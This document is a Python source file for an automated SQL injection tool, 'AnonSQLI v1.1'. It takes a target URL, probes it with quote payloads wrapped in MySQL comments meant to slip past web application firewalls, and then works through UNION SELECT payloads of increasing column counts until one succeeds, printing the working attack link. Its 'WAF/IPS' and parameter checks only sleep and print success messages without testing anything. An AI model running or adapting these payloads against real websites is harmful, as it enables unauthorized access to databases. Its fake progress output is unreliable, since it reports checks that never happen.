# AnonSQLI v1.1
#   ___                  ________    __   _ 
#  / _ | ___  ___  ___  / __/ __ \  / /  (_)
# / __ |/ _ \/ _ \/ _ \_\ \/ /_/ / / /__/ / 
#/_/ |_/_//_/\___/_//_/___/\___\_\/____/_/ 
# Copyright : Pham Chien
# Github : https://github.com/Phamchie
# Twitter : https://twitter.com/Anonym0us_VNPC
# Anonymous-SQL-Injection
# Auto Exloit Columns Sql Injecttion
import requests
import argparse
import datetime
import time
import colorama
import re
import random
from colorama import Fore 
from colorama import Style

colorama.init()

def session():
    parser = argparse.ArgumentParser(description="Auto-SQL-Injection")
    parser.add_argument('-u', '--url', dest='url', help='Target URL (EX : https://test.com/your_path.php?query=id )')
    parser.add_argument('--check-columns', dest='columns', action='store_true', help='Testing payload select columns')

    args = parser.parse_args()

    url_target = args.url
    if url_target:
        def __check_conn__():
            print(Fore.GREEN + "[info] " + Style.RESET_ALL + "testing connect to the target URL")
            check_conn = requests.get(url_target)
            if check_conn.status_code == 200:
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Connection : OK..............")
                def check_WAF_IPS():
                    print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Testing if checking projection WAF/IPS")
                    time.sleep(1.8)
                    print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Testing if the HTML content")
                    def chck_html_content():
                        content_html = requests.get(url_target)
                        content = content_html.text
                    print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Testing GET parameter 'CAT' ID...........")
                    time.sleep(2.1)
                    print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Testing SQL injection on GET 'cat' parameter...")
                    time.sleep(1.6)
                    print(Fore.GREEN + "[info] " + Style.RESET_ALL + "completed, all is OK.")
                check_WAF_IPS()
                def times():
                    time.sleep(0.20)
                times() 
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "starting testing check injection...........")
                def __check_vuln__():
                    payloads_1 = ["/**8**/%27", "/*!50000*/%27"]
                    for payload_1 in payloads_1:
                        print(Fore.GREEN + "[info] " + Style.RESET_ALL + f"Testing '{payload_1}'..............")
                        results_1 = requests.get(url_target + payload_1)
                        if results_1.status_code == 200:
                            print(Fore.GREEN + "[info] " + Style.RESET_ALL + "connection : OK.....")
                            if "at line" in results_1.text:
                                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Bypass Find : '{}'.......".format(payload_1))
                                print("Parameter : 1")
                                print("URL : {}".format(url_target))
                                print("")
                                print("PAYLOAD : {}".format(payload_1))
                                print("")
                                print("ERROR : SQL Columns")
                                print("")
                                break
                            else:
                                print(Fore.RED + Style.BRIGHT + "[warning] " + Style.RESET_ALL + "Oops, Target Not Vulnerable ?")
                                break
                        else:
                            print(Fore.RED + Style.BRIGHT + "[warning] " + Style.RESET_ALL + "Connection Not Accepted.............")
                            break
            else:
                print(Fore.RED + Style.BRIGHT + "[warning] " + Style.RESET_ALL + "Connection Not Accepted.............")
            __check_vuln__()
        __check_conn__()

        if args.columns:
            def check_database():
                payload_name = [
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
                    # Union NULL Columns
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                    '/**8**//*!50000/**8**/UNION*//**8**//*!50000/**8**/SELECT*/null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+-',
                ]
                print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Testing 'UNION SELECT COLUMNS'.....")
                num_columns = 1
                for payload in payload_name:
                    number = random.randint(65989, 99999999999999999999999)
                    num_columns += 1
                    results_2 = requests.get(url_target + payload)
                    if str(num_columns) in results_2.text:
                        if "The used SELECT statements have a different number of columns" in results_2.text:
                            print(Fore.GREEN + "[info] " + Style.RESET_ALL + "RANDOM num : 0x{} , columns : {}".format(number, num_columns))
                            print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Payload Not FOund : {}".format(payload))
                        else:
                            print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Payload {} columns found.........".format(num_columns))
                            time.sleep(2)
                            print("Parameter : 1")
                            print("URL target : {}".format(url_target))
                            print("COLUMNS : {}".format(num_columns))
                            print("Payload Columns : {}".format(payload))
                            print("")
                            print("LINK : {}{}".format(url_target, payload))
                            exit()
                    
                    else:
                        print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Columns not valid to the target, number columns : {}".format(num_columns))
                        print(Fore.GREEN + "[info] " + Style.RESET_ALL + "RANDOM num : 0x{} , columns : {}".format(number, num_columns))
                        print(Fore.GREEN + "[info] " + Style.RESET_ALL + "Payload Not FOund : {}".format(payload))
                        pass

            check_database()
    else:
        print("Usage : python3 anonsqli.py -u <url>")
        print("HELP : python3 anonsqli.py --help for helping")
        exit()

if __name__ == '__main__':
    def banner():
        start_time = datetime.datetime.now().strftime("Starting %H:%M:%S - /%d/%m/%Y @a")
        print(Fore.BLUE + f'''
   ___                  ________    __   _ 
  / _ | ___  ___  ___  / __/ __ \  / /  (_) 
 / __ |/ _ \/ _ \/ _ \_\ \/ /_/ / / /__/ / 
/_/ |_/_//_/\___/_//_/___/\___\_\/____/_/  
''' + Style.RESET_ALL)
        print(f'''
    Copyright : Phamchien
    github : https://github.com/Phamchie
    twitter : https://twitter.com/Anonym0us_VNPC
    version : 1.1

    {start_time}
''')
    banner()
    session()
